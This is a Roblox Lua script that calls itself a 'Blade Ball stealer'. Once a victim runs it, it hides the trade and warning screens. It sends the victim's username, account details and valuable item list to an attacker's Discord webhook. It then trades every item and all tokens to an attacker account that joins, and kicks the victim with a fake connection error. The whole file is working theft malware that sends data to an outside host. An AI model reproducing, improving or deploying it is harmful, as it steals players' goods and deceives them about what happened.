_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "" 

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("only work on server normal")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = {
        [1] = itemType,
        [2] = ID
    }
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
    until response == true
end

local function readyTrade()
    local args = {
        [1] = true
    }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until response == true
end

local function confirmTrade()
    repeat
        wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then
        return "0"
    end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local totalRAP = 0

local function SendJoinMessage(list, prefix)
    local tokensEmbed = "0"
    pcall(function() tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "") end)

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or {Count = 0, TotalRAP = 0})
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    local itemListText = ""
    for _, group in ipairs(groupedList) do
        itemListText = itemListText .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["content"] = (ping == "Yes" and "||​|| @everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["auth_token"] = auth_token, 
        ["embeds"] = {{
            ["title"] = "🟣 Join your hit",
            ["color"] = 8323327,
            ["fields"] = {
                {
                    ["name"] = "ℹ️ Player info:",
                    ["value"] = "```" ..
                        "\n🆔 Username      : " .. plr.Name ..
                        "\n👤 Display Name  : " .. plr.DisplayName ..
                        "\n🗓️ Account Age   : " .. plr.AccountAge .. " Days" ..
                        "\n⚡ Executor      : " .. (identifyexecutor and identifyexecutor() or "Unknown") ..
                        "\n🪙 Tokens        : " .. formatNumber(tonumber(tokensEmbed)) ..
                        "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Item list 📝:",
                    ["value"] = "```\n" .. (itemListText ~= "" and itemListText or "No items") .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "Summary 💰:",
                    ["value"] = "```\nTotal RAP: " .. formatNumber(totalRAP) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "🔗 Quick Links", 
                    ["value"] = "[**JOIN SERVER**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ") | [**RAW INVENTORY**](https://inventory.roblox.com/v1/users/"..plr.UserId.."/assets/collectibles?assetType=All&sortOrder=Asc&limit=100)", 
                    ["inline"] = false
                }
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack • " .. os.date("%X")},
            ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local itemListSent = ""
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    for name, count in pairs(grouped) do
        itemListSent = itemListSent .. name .. " (x" .. count .. ")\n"
    end

    if #itemListSent > 1000 then
        itemListSent = string.sub(itemListSent, 1, 950) .. "\nPlus more..."
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "🟢 Hit is still in the server",
            ["color"] = 65280, -- VERT (Comme demandé plus tôt pour différencier quand tu rejoins)
            ["fields"] = {
                {
                    ["name"] = "👤 Victim:",
                    ["value"] = "```" .. plr.Name .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "💰 Summary:",
                    ["value"] = "```Total RAP: " .. formatNumber(totalRAP) .. "```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Items to be sent 📝:",
                    ["value"] = "```\n" .. (itemListSent ~= "" and itemListSent or "None") .. "```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Blade Ball stealer by Eblack"
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            }
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]

    if not categoryRapData then
        return nameToRAP
    end

    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function()
            return HttpService:JSONDecode(serializedKey)
        end)

        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then
                    local itemName = pair[2]
                    nameToRAP[itemName] = rap
                    break
                end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do
    rapMappings[category] = buildNameToRAPMap(category)
end

local function getRAP(category, itemName)
    local rapMap = rapMappings[category]
    if rapMap then
        local rap = rapMap[itemName]
        if rap then
            return rap
        else
            return 0
        end
    else
        return 0
    end
end

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if itemInfo.TradeLock then
            continue
        end
        local itemName = itemInfo.Name
        local rap = getRAP(category, itemName)
        if rap >= min_rap then
            totalRAP = totalRAP + rap
            table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemName})
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        return a.RAP > b.RAP
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do
        sentItems[i] = v
    end

    local prefix = ""
    if ping == "Yes" then
        prefix = "--[[@everyone]] "
    end

    SendJoinMessage(itemsToSend, prefix)

    local function getNextBatch(items, batchSize)
        local batch = {}
        for i = 1, math.min(batchSize, #items) do
            table.insert(batch, table.remove(items, 1))
        end
        return batch
    end

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat
                wait(0.5)
            until inTrade

            local currentBatch = getNextBatch(itemsToSend, 100)
            for _, item in ipairs(currentBatch) do
                addItemToTrade(item.itemType, item.ItemID)
            end

            local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
            local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
            local cleanedText = trimmedText:gsub("[^%d]", "")
            local tokensamount = tonumber(cleanedText) or 0
            if tokensamount >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
            end

            readyTrade()
            confirmTrade()
        end
        plr:kick("Please check your internet connection and try again. (Error Code: 277)")
    end

    local function waitForUserJoin()
        local sentMessage = false
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                if not sentMessage then
                    SendMessage(sentItems)
                    sentMessage = true
                end
                doTrade(player.Name)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
